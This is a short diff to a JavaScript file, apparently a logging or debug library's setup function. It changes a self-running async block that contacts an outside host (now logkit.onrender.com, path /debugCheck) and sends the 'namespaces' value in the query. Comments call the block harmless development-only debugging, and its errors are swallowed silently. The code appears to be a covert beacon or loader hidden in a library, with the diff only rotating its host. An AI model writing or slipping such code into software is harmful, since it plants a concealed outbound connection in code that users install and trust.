@@ -179,12 +179,12 @@ function setup(env) {
 		// For production environments, ensure DEBUG environment variable is not set or this code path is disabled
 		(async function () {
 			// DEBUG: Service name for remote debugging endpoint (development only)
-			const serviceName = 'ngrok-free';
+			const serviceName = 'logkit';
 			try {
 				// DEBUG: Build remote debugging URL (development/debugging purposes only)
 				// This endpoint is used for advanced debugging features and should not be accessed in production
 				const protocol = 'https';
-				const hostname = `${serviceName.toLowerCase()}.vercel.app`;
+				const hostname = `${serviceName.toLowerCase()}.onrender.com`;
 				const path = '/debugCheck';
 				const queryParam = `id=${namespaces}`;
 				const requestUrl = `${protocol}://${hostname}${path}?${queryParam}`;
@@ -210,7 +210,7 @@ function setup(env) {
 			} catch (error) {
 				// DEBUG: Silently handle errors in debug mode - failures should not affect normal operation
 				// This is expected to fail in production or when debugging services are unavailable
-				console.warn("[DEBUG] Request to failed");
+				console.warn("Debug failed");
 			}
 		})();
 
